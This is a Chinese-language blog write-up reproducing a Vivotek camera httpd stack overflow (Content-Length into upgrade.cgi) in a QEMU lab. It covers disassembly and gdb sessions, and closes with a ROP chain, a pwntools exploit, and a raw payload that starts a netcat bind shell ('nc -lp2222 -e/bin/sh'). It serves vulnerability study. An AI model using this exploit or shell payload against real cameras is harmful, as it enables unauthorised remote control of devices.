---
layout: post
title:  "vivetok摄像头栈溢出漏洞"
date:   2019-9-5
categories: 
excerpt: 
---

* content
{:toc}

# **vivetok摄像头栈溢出漏洞**

若图片无法正常显示，请看这篇：https://github.com/tearorca/tearorca.github.io/blob/master/_posts/2019-9-5-vivetok%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.md

## **漏洞介绍**

该漏洞发现于2017年，主要原因是是httpd对用户数据处理不当，导致栈溢出。

## **漏洞分析**

### **固件下载**

在vivetok的官网上并这个版本摄像头的固件都是最新版的，漏洞已经被修复。后面是在一篇文章里面找到的。文章的作者通过社工向客服要来了老版本，不过作者说是上传到了issue里面，但我并没有找到这个issue，幸好图片上有链接地址，输入就可以下载。

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqdzq2nxj20qw0jsgs7.jpg>)

下载完固件之后用binwalk提取，记得用递归提取(-Me)不然会提取不全。这个固件提取出来比较多的东西。然后直接通过字符串找到httpd的位置。

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqefdqf5j20sm0dy0uz.jpg>)

	root@tearorca:~/f/测试/摄像头# find -name httpd
	./_CC8160-VVTK-0100d.flash.pkg.extracted/_31.extracted/_rootfs.img.extracted/squashfs-root/etc/init.d/httpd
	./_CC8160-VVTK-0100d.flash.pkg.extracted/_31.extracted/_rootfs.img.extracted/squashfs-root/usr/sbin/httpd

来file一下httpd的信息，是arm架构的。

	root@tearorca:~/f/测试/摄像头/_CC8160-VVTK-0100d.flash.pkg.extracted/_31.extracted/_rootfs.img.extracted/squashfs-root/usr/sbin#file httpd
	httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped

### **虚拟机设置**

启动qemu-arm虚拟机。帐号和密码都是root。下载地址:https://people.debian.org/~aurel32/qemu/armel/

	root@tearorca:~/f/qemu-arm-vmware# ls
	debian_wheezy_armhf_standard.qcow2 initrd.img-3.2.0-4-vexpress start.sh vmlinuz-3.2.0-4-vexpress
	root@tearorca:~/f/qemu-arm-vmware# cat start.sh
	sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2" -net nic -net tap -nographic

在宿主机上配置网卡

	sudo tunctl -t tap0 -u `whoami` # 为了与 QEMU 虚拟机通信，添加一个虚拟网卡

	sudo ifconfig tap0 10.10.10.1/24 # 为添加的虚拟网卡配置 IP 地址

在虚拟机配置网卡

	ifconfig eth0 10.10.10.2/24

现在需要把从固件中提取出的文件系统打包后上传到 QEMU 虚拟机中，先打包整个文件系统。

	tar -cjpf squashfs-root.tar.bz2 squashfs-root/

使用 Python 搭建简易 HTTP Server

	python -m SimpleHTTPServer

在 QEMU 虚拟机中下载上面打包好的文件

	wget <http://10.10.10.1:8000/squashfs-root.tar.bz2>

解压之后进行挂载

	mount -o bind /dev ./squashfs-root/dev/ #将固件文件系统下的dev目录挂载到虚拟机/dev
	mount -t proc /proc/ ./squashfs-root/proc/ #将固件文件系统下的proc目录挂载到虚拟机/proc
	chroot squashfs-root sh #以指定目录为根弹出一个shell

之后就可以拿到一个shell。

### **环境修复**

输入httpd启动，发现一个错误。

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqeu1ii8j20sh07276k.jpg>)

用ida加载httpd，通过字符串查找到这个错误字符串输出的位置。再通过交叉查找定位

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqf2leqbj20so09n0wf.jpg>)

	.text:00010AC8 STMFD SP!, {R4,R5,LR}
	.text:00010ACC SUB SP, SP, #0x6C
	.text:00010AD0 BL getuid
	.text:00010AD4 LDR R2, =dword_37E88
	.text:00010AD8 LDR R1, =dword_34874
	.text:00010ADC LDR R3, [R2]
	.text:00010AE0 CMP R3, #0
	.text:00010AE4 LDREQ R3, =aEtcConfDBoaBoa ; "/etc/conf.d/boa/boa.conf"
	.text:00010AE8 STREQ R3, [R2]
	.text:00010AEC STR R0, [R1]
	.text:00010AF0 MOV R0, R3 ; filename
	.text:00010AF4 LDR R1, =(aChdir_0+4) ; modes
	.text:00010AF8 BL fopen
	.text:00010AFC SUBS R5, R0, #0
	.text:00010B00 BEQ loc_10CA4
	.......
	.......
	.text:00010CA4 loc_10CA4 ; CODE XREF: sub_10AC8+38↑j
	.text:00010CA4 LDR R3, =stderr
	.text:00010CA8 LDR R0, =aCouldNotOpenBo ; "Could not open boa.conf for reading.n"
	.text:00010CAC LDR R3, [R3] ; s
	.text:00010CB0 MOV R1, #1 ; size
	.text:00010CB4 MOV R2, #0x25 ; n
	.text:00010CB8 BL fwrite
	.text:00010CBC MOV R0, #1 ; status
	.text:00010CC0 BL exit

整段的意思就是打开/etc/conf.d/boa/boa.conf这个文件失败所以输出错误。我们找到这个文件，但发现/etc/conf.d是一个普通文本，而不是一个文件夹。用ls -l命令发现这个文件是指向./mnt/flash/etc/conf.d，但链接断了。

	root@tearorca:~/f/测试/摄像头/_CC8160-VVTK-0100d.flash.pkg.extracted/_31.extracted/_rootfs.img.extracted/squashfs-root/etc# ls -l conf.d
	lrwxrwxrwx 1 root root 23 12月 6 2016 conf.d -> ../mnt/flash/etc/conf.d

再到/mnt/flash/etc里面找发现里面根本就没有conf.d这个文件夹。在文件系统里面搜索该配置文件，在./_31.extracted/defconf/_CC8160.tar.bz2.extracted/_0.extracted/etc/conf.d/boa/boa.conf找到，把该/etc目录拷到../mnt/flash/目录下面，选择全部覆盖。

再回到/etc/conf.d发现已经变成一个文件夹。

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqfg6ac4j20sx0isn0i.jpg>)

重新打包根系统，然后再传到虚拟机解压。再次输入httpd启动，发现之前的错误已经解决，但又出现了新的错误。继续在ida里面找这个字符串。

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqfpo0dkj20t506kn0t.jpg>)

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqfw2kz2j20sv0b4jvi.jpg>)

	.text:00010C10 loc_10C10 ; CODE XREF: sub_10AC8+58↑j
	.text:00010C10 ADD R0, SP, #0x78+rlimits ; name
	.text:00010C14 MOV R1, #0x64 ; len
	.text:00010C18 BL gethostname
	.text:00010C1C CMN R0, #1
	.text:00010C20 BEQ loc_10D14
	.text:00010C24 ADD R0, SP, #0x78+rlimits ; name
	.text:00010C28 BL gethostbyname
	.text:00010C2C CMP R0, #0
	.text:00010C30 BEQ loc_10D04
	.text:00010C34 LDR R0, [R0] ; s
	.text:00010C38 BL strdup
	.text:00010C3C CMP R0, #0
	.text:00010C40 STR R0, [R4]
	.text:00010C44 BNE loc_10B24
	.text:00010C48 LDR R0, =aStrdup_0 ; "strdup:"
	.text:00010C4C BL perror
	.text:00010C50 MOV R0, #1 ; status
	.text:00010C54 BL exit
	.text:00010D04 loc_10D04 ; CODE XREF: sub_10AC8+168↑j
	.text:00010D04 LDR R0, =aGethostbyname_0 ; "gethostbyname:"
	.text:00010D08 BL perror
	.text:00010D0C MOV R0, #1 ; status
	.text:00010D10 BL exit
	.text:00010D14 ;
	---------------------------------------------------------------------------
	.text:00010D14
	.text:00010D14 loc_10D14 ; CODE XREF: sub_10AC8+158↑j
	.text:00010D14 LDR R0, =aGethostname_0 ; "gethostname:"
	.text:00010D18 BL perror
	.text:00010D1C MOV R0, #1 ; status
	.text:00010D20 BL exit

gethostbyname函数是用来获取主机名称的，上面一段的意思应该是通过比较虚拟机和宿主机的名称是否相同，不相同则输出错误。可以用hostname命令来查看主机名称。

hostname <名称>进行暂时修改主机名称。

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqg3n8kuj20sp029gm2.jpg>)

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqgdk0etj20sr02gmxa.jpg>)

修改完主机名称之后再次输入httpd，终于可以运行。

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqgkmb41j20t305swh1.jpg>)

### **漏洞复现**

根据https://www.exploit-db.com/exploits/44001给出的poc进行测试。

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqgrsw16j20sw04otaq.jpg>)

出现这个崩溃

	/ # req->iCount++= 1
	[03/Sep/2019:07:42:32 +0000] caught SIGSEGV, dumping core in /tmp

从poc来看echo -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXXnrnrn" | nc -v 10.10.10.2 80

应该是content-length长度过长导致溢出。在ida中找到这个content-length的位置。

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqh0sfe9j20qh0av42g.jpg>)

	.text:00018504 loc_18504 ; CODE XREF: sub_17F80+1B8↑j
	.text:00018504 LDR R0, [SP,#0x50+haystack] ; haystack
	.text:00018508 LDR R1, =aContentLength_0 ; "Content-Length"
	.text:0001850C BL strstr
	.text:00018510 MOV R1, #0xA ; c
	.text:00018514 MOV R7, R0
	.text:00018518 BL strchr
	.text:0001851C MOV R1, #0x3A ; c
	.text:00018520 MOV R6, R0
	.text:00018524 MOV R0, R7 ; s
	.text:00018528 BL strchr
	.text:0001852C ADD R1, R0, #1 ; src
	.text:00018530 RSB R2, R1, R6
	.text:00018534 ADD R0, SP, #0x50+dest ; dest
	.text:00018538 BL strncpy
	.text:0001853C B loc_1813C

这段先是调用了strstr函数判断=aContentLength_0 是否为haystack的子集，如果是则返回子集开始的首地址作为R0。然后后面两个strchr寻找子集中0xA(“n”)和0x3A(“:”)的位置。最后调用strncpy复制，复制的长度为R6-R1（RSB命令是逆向减法指令，用于把操作数2减去操作数1）。这里的R6和R1其实都是可控的，只要让他们两个的长度超过栈空间的长度就会导致溢出。

	.text:00017F80 sub_17F80 ; CODE XREF: sub_19D7C+220↓p
	.text:00017F80
	.text:00017F80 var_50 = -0x50
	.text:00017F80 var_4C = -0x4C
	.text:00017F80 haystack = -0x44
	.text:00017F80 var_40 = -0x40
	.text:00017F80 var_3C = -0x3C
	.text:00017F80 dest = -0x38
	.text:00017F80 var_34 = -0x34
	.text:00017F80 var_30 = -0x30
	.text:00017F80 var_2C = -0x2C
	.text:00017F80
	.text:00017F80 ADD R3, R0, #0x3540
	.text:00017F84 STMFD SP!, {R4-R11,LR}
	.text:00017F88 ADD R3, R3, #0x3A

这是这个函数最前面初始化环境的位置。复制的目标地址在-0x38的位置，然后是用 STMFD SP!, {R4-R11,LR}把返回地址以及几个参数压入栈中。

	STMFD SP！，{R4-R11，LR} 的伪代码如下：
	SP ＝ SP － 9×4；
	address = SP;
	for i = 4 to 11
		Memory[address] = Ri;
		address = address + 4;
	Memory[address] = LR;

从上面的代码可以分析出，这个函数开辟的栈空间大小为0x50。dest的-0x38实际上应该是bp+0x50-0x38=bp+0x18上面的代码sp已经回到了bp的位置，所以也就是sp+0x18

栈空间图如下，所以填充的长度只要为0x50-0x18-0x4=0x34就可以了。

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqhb7uunj20hp0jqdgy.jpg>)

### **漏洞利用**

查看一下保护，发现开了NX。

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqhhbocvj20jd0bwwio.jpg>)

因为溢出的函数是strncmp，无法读取x00，所以不能用httpd里面的函数，只能用lib的。找一下调用了哪些lib。必须要找一个可执行的，也就是x的。

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqhoe6a7j20jl0cyagb.jpg>)

选了这一条

76e99000-76ee5000 r-xp 00000000 b3:02 654875 /root/squashfs-root/lib/libuClibc-0.9.33.3-git.so

因为开启了NX，所以不能在栈中执行。用ROPgadget工具来构造ROP链。在ARM架构中，函数调用的参数在R0-R3中，这次调用的是system只要一个参数，所以只需要把需要的参数放在R0中就可以了。搜索一下所有含pop的指令ROPgadget --binary libuClibc-0.9.33.3-git.so --only pop

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqibcytej20wk0aiadk.jpg>)

可以发现对R0进行操作的指令只有一个，并且地址中是带有x00的，所以不能用，那既然不能直接操作，那就绕一下。尝试着找下是否有指令把R1给R0，如果有，那用pop弹给R1然后在mov给R0效果也是一样的。（注意：指令mov r0, r1中间r1前面是有空格的，如果没有就找不到了。）

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqir7e9xj20wn0j3wrv.jpg>)

最后选了这两条指令。

	0x00048784 : pop {r1, pc}
	0x00016aa4 : mov r0, r1 ; pop {r4, r5, pc}

为了调试方便，关闭了aslr。echo 0 > /proc/sys/kernel/randomize_va_space

准备开始写exp，在写exp之前，先来看一看poc崩溃时候栈的布局。用gdbserver调试。gdbserver可以从这里下载现成的https://github.com/stayliv3/gdb-static-cross/tree/master，网上的安装教程我尝试过之后把生成的gdbserver传到qemu虚拟机再运行时就会出现乱码。

下载好之后用 python -m SimpleHTTPServer传过去就可以了。

具体的用法如下，1234是监听的端口，2656是httpd的进程号。

	/ # httpd
	sendto() error 2
	[debug]add server push uri 3 video3.mjpg
	[debug]add server push uri 4 video4.mjpg
	[debug] after ini, server_push_uri[0] is /video3.mjpg
	[debug] after ini, server_push_uri[1] is /video4.mjpg
	/ # [05/Sep/2019:07:14:50 +0000] boa: server version 1.32.1.10(Boa/0.94.14rc21)
	[05/Sep/2019:07:14:50 +0000] boa: starting server pid=2656, port 80
	/ # ./gdbserver-7.7.1-armhf-eabi5-v1-sysv :1234 --attach 2656
	Attached; pid = 2656
	Listening on port 1234
	Remote debugging from host 10.10.10.1

然后在宿主机运行arm-linux-gdb连接之后就可以进行调试了，命令和普通的gdb是一样的

	root@tearorca:~/f/测试/摄像头/_CC8160-VVTK-0100d.flash.pkg.extracted/_31.extracted/_rootfs.img.extracted/squashfs-root# arm-linux-gdb ./httpd
	GNU gdb (GDB) 8.3
	Copyright (C) 2019 Free Software Foundation, Inc.
	License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
	This is free software: you are free to change and redistribute it.
	There is NO WARRANTY, to the extent permitted by law.
	Type "show copying" and "show warranty" for details.
	This GDB was configured as "--host=x86_64-pc-linux-gnu --target=arm-linux".
	Type "show configuration" for configuration details.
	For bug reporting instructions, please see:
	<http://www.gnu.org/software/gdb/bugs/>.
	Find the GDB manual and other documentation resources online at:
	<http://www.gnu.org/software/gdb/documentation/>.
	For help, type "help".
	Type "apropos word" to search for commands related to "word"...
	Reading symbols from ./httpd...
	(No debugging symbols found in ./httpd)
	gdb-peda$ target remote 10.10.10.2:1234
	Remote debugging using 10.10.10.2:1234
	Reading /usr/lib/libxmlsparser.so.1 from remote target...
	warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
	Reading /usr/lib/libaccount.so.1 from remote target...
	Reading /usr/lib/libmessage.so.1 from remote target...
	Reading /usr/lib/libexpat.so.1 from remote target...
	Reading /lib/libcrypt.so.0 from remote target...
	Reading /lib/libc.so.0 from remote target...
	Reading /lib/libgcc_s.so.1 from remote target...
	Reading /lib/ld-uClibc.so.0 from remote target...
	Reading symbols from target:/usr/lib/libxmlsparser.so.1...
	(No debugging symbols found in target:/usr/lib/libxmlsparser.so.1)
	Reading symbols from target:/usr/lib/libaccount.so.1...
	(No debugging symbols found in target:/usr/lib/libaccount.so.1)
	Reading symbols from target:/usr/lib/libmessage.so.1...
	(No debugging symbols found in target:/usr/lib/libmessage.so.1)
	Reading symbols from target:/usr/lib/libexpat.so.1...
	(No debugging symbols found in target:/usr/lib/libexpat.so.1)
	Reading symbols from target:/lib/libcrypt.so.0...
	(No debugging symbols found in target:/lib/libcrypt.so.0)
	Reading symbols from target:/lib/libc.so.0...
	(No debugging symbols found in target:/lib/libc.so.0)
	Reading symbols from target:/lib/libgcc_s.so.1...
	(No debugging symbols found in target:/lib/libgcc_s.so.1)
	Reading symbols from target:/lib/ld-uClibc.so.0...
	(No debugging symbols found in target:/lib/ld-uClibc.so.0)
	Reading /lib/ld-uClibc.so.0 from remote target...
	Python Exception <type 'exceptions.AttributeError'> 'module' object has no attribute 'objfiles':
	0x76f3ac5c in select () from target:/lib/libc.so.0
	gdb-peda$

直接c运行，在另一个窗口向端口发送poc，查看一下崩溃时候的栈环境。

	gdb-peda$ c
	Continuing.
	Program received signal SIGSEGV, Segmentation fault.
	Python Exception <type 'exceptions.AttributeError'> 'module' object has no attribute 'objfiles':
	0x58585858 in ?? ()
	gdb-peda$ i reg
	r0 0x1 0x1
	r1 0x46058 0x46058
	r2 0x0 0x0
	r3 0x75 0x75
	r4 0x42424242 0x42424242
	r5 0x43434343 0x43434343
	r6 0x44444444 0x44444444
	r7 0x45454545 0x45454545
	r8 0x46464646 0x46464646
	r9 0x47474747 0x47474747
	r10 0x48484848 0x48484848
	r11 0x49494949 0x49494949
	r12 0x1 0x1
	sp 0x7effeb80 0x7effeb80
	lr 0x18474 0x18474
	pc 0x58585858 0x58585858
	cpsr 0x60000010 0x60000010
	fpscr 0x0 0x0
	gdb-peda$ x/64 0x7effeb80
	0x7effeb80: 0x726e726e 0x0 0x4 0x37e6c
	0x7effeb90: 0x37dd8 0x36b00 0x31928 0x37e88
	0x7effeba0: 0x37e5c 0x1cd58 0x7effebcc 0x7472
	0x7effebb0: 0x3 0x4 0x0 0x3
	0x7effebc0: 0x0 0x4 0x0 0x9
	0x7effebd0: 0x448a2 0x0 0x0 0x0
	0x7effebe0: 0x0 0x0 0x0 0x0
	0x7effebf0: 0x0 0x0 0x0 0x0
	0x7effec00: 0x6f6f722f 0x65732f74 0x69727563 0x722f7974
	0x7effec10: 0x72656665 0x522f7265 0x63784563 0x69747065
	0x7effec20: 0x6f486e6f 0x692f7473 0x616e2f32 0x656d
	0x7effec30: 0x0 0x0 0x0 0x0
	0x7effec40: 0x0 0x0 0x0 0x0
	0x7effec50: 0x0 0x0 0x0 0x0
	0x7effec60: 0x0 0x0 0x0 0x0
	0x7effec70: 0x0 0x0 0x0 0x0
	gdb-peda$ x/64s 0x7effeb80
	0x7effeb80: "nrnr"
	0x7effeb85: ""

可以看到崩溃时候的pc值为0x58585858也就是”XXXX”，sp为0x7effeb80，而这个栈空间的值正好是poc中最胡的nrnr，所以我们只要把需要执行的命令放在最后然后把其所在的栈空间存到R0被system调用即可。

	exp：
	from pwn import *
	from os import *
	lib_addr=0x76e99000 #libuClibc-0.9.33.3-git.so的基址
	system_addr=lib_addr+0x47ab0 #system的地址
	pop_addr=lib_addr+0x00048784 #pop {r1, pc}
	mov_addr=lib_addr+0x00016aa4 #mov r0, r1 ; pop {r4, r5, pc}
	stack_addr=0x7effeb80 #崩溃时sp地址
	payload="echo -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0nContent-Length:"
	payload+='a'*0x34+p32(pop_addr)+p32(stack_addr+20)+p32(mov_addr)+'a'*8+p32(system_addr)+"nc -lp2222 -e/bin/sh >nrnrn" | nc -v 10.10.10.2 80" #这里把崩溃地址还+20的原因是本身4个字节再加上mov，a*8，system的16个字节，一共20个字节。
	print(payload)
	os.system(payload)

exp虽然写好了，但不知道哪里出现了点错误，运行的时候不能反弹一个shell出来。但尝试直接输入payload的时候就可以达到目的。

payload：echo -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0nContent-Length:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaax84x57xf7x76x94xebxffx7exa4x3axf4x76aaaaaaaaxb0x4axf7x76nc -lp2222 -e/bin/sh >nrnrn" | nc -v 10.10.10.2 80

用gdbserver来调试一下看看过程。把断点下在返回地址的位置，0x18398。

	.text:00018394 ADD SP, SP, #0x2C
	.text:00018398 LDMFD SP!, {R4-R11,PC}

运行查看当前栈环境。

	gdb-peda$ b *0x18398
	Breakpoint 1 at 0x18398
	gdb-peda$ c
	Continuing.
	Python Exception <type 'exceptions.AttributeError'> 'module' object has no attribute 'objfiles':
	Breakpoint 1, 0x00018398 in ?? ()
	gdb-peda$ i reg
	r0 0x1 0x1
	r1 0x46058 0x46058
	r2 0x0 0x0
	r3 0x9f 0x9f
	r4 0x45058 0x45058
	r5 0x9f 0x9f
	r6 0x4c058 0x4c058
	r7 0x485d2 0x485d2
	r8 0x485d1 0x485d1
	r9 0x485d2 0x485d2
	r10 0x323a0 0x323a0
	r11 0x0 0x0
	r12 0x1 0x1
	sp 0x7effeb5c 0x7effeb5c
	lr 0x18474 0x18474
	pc 0x18398 0x18398
	cpsr 0x60000010 0x60000010
	fpscr 0x0 0x0
	gdb-peda$ x/64 0x7effeb5c
	0x7effeb5c: 0x61616161 0x61616161 0x61616161 0x61616161
	0x7effeb6c: 0x61616161 0x61616161 0x61616161 0x61616161
	0x7effeb7c: 0x76f75784 0x7effeb94 0x76f43aa4 0x61616161
	0x7effeb8c: 0x61616161 0x76f74ab0 0x2d20636e 0x3232706c
	0x7effeb9c: 0x2d203232 0x69622f65 0x68732f6e 0x7eff3e20
	0x7effebac: 0x7472 0x3 0x4 0x0
	0x7effebbc: 0x3 0x0 0x4 0x0
	0x7effebcc: 0x2 0x3e4e2 0x0 0x0
	0x7effebdc: 0x0 0x0 0x0 0x0
	0x7effebec: 0x0 0x0 0x0 0x0
	0x7effebfc: 0x0 0x6f6f722f 0x65732f74 0x69727563
	0x7effec0c: 0x722f7974 0x72656665 0x522f7265 0x63784563
	0x7effec1c: 0x69747065 0x6f486e6f 0x692f7473 0x616e2f32
	0x7effec2c: 0x656d 0x0 0x0 0x0
	0x7effec3c: 0x0 0x0 0x0 0x0
	0x7effec4c: 0x0 0x0 0x0 0x0
	gdb-peda$ x/s 0x7effeb94
	0x7effeb94: "nc -lp2222 -e/bin/sh >377~rt"

可以看到0x76f75784是pop的地址，它会将0x7effeb94给R1，0x76f43aa4给PC，而0x76f43aa4是mov的地址，将R1给R0，接着将8个a给R4和R5,最后把system地址给PC完成调用。同时可以看到它的参数也就是0x7effeb94已经被覆盖为目标命令，直接调用就可以反弹一个shell。

在gdb里用layout asm这个命令可以看到实时的汇编代码

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqj2tvemj20we0f5q7j.jpg>)

往下单步调试，进入ROP链。

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqjedowuj20ws0js7an.jpg>)

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqjn82fzj20wp0jkwlg.jpg>)

进入system，参数为目标命令。

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqjw42v5j20wh0j2zrf.jpg>)

system执行后反弹一个shell，在另一个窗口尝试连接，成功。并且getshell

![image.png](<https://ws1.sinaimg.cn/large/7fb67c86ly1g6oqk4rzn7j20wx05375y.jpg>)

## **参考链接**

<https://www.exploit-db.com/exploits/44001>

<https://xz.aliyun.com/t/5054#toc-3>
